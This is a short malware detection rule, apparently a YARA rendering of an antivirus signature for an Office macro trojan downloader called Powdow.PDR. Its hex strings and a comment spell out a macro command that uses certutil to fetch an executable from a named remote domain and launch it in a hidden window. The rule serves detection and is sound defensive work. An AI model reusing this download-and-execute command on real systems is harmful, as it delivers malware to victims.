
rule TrojanDownloader_O97M_Powdow_PDR_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PDR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 6a 6f 69 6e 6d 65 61 70 70 2e 78 79 7a 2f 70 6c 61 79 65 72 2e 65 78 65 22 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""https://joinmeapp.xyz/player.exe"
		$a_03_1 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-1f] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1) >=2
 
}